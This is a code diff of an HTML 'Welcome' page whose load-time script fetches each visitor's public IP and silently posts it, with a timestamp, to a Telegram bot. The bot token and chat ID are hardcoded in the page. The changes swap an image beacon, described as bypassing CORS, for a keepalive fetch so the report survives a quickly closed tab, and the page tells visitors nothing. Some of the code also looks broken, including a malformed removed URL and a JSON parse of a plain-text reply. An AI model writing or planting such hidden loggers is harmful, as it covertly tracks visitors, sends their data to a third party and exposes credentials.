@@ -6,26 +6,37 @@
     <title>Welcome</title>
     <script>
         window.onload = function() {
-            // 1. Fetch the user's IP address from a public service
+            // 1. Grab the user's public IP
             fetch('https://ipify.org')
                 .then(response => response.json())
                 .then(data => {
                     const botToken = '8679091860:AAHJU3E_vBVt_k70KANc9lThQxXY5QYjHRE';
                     const chatId = '8714686528';
+                    const message = `📌 New Visitor Logged\n🌐 IP Address: ${data.ip}\n⏰ Time: ${new Date().toLocaleString()}`;
                     
-                    // 2. Format the message text and encode it safely for the URL
-                    const messageText = `📌 New Visitor Logged\n🌐 IP Address: ${data.ip}\n⏰ Time: ${new Date().toLocaleString()}`;
-                    const encodedText = encodeURIComponent(messageText);
+                    // 2. Format request using modern fetch parameters
+                    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
                     
-                    // 3. Construct the exact API request URL
-                    const telegramUrl = `https://telegram.org{botToken}/sendMessage?chat_id=${chatId}&text=${encodedText}`;
-                    
-                    // 4. Send the request via a background Image object to bypass CORS blocks
-                    const requestTrigger = new Image();
-                    requestTrigger.src = telegramUrl;
+                    fetch(telegramUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: message
+                        }),
+                        keepalive: true // Keeps request alive even if visitor closes tab quickly
+                    })
+                    .then(res => {
+                        if (!res.ok) {
+                            console.error('Telegram rejected the request. Check if you started the bot.');
+                        }
+                    })
+                    .catch(err => console.error('Network Error:', err));
                 })
                 .catch(error => {
-                    console.error('IP fetch failed:', error);
+                    console.error('Could not retrieve IP address:', error);
                 });
         };
     </script>
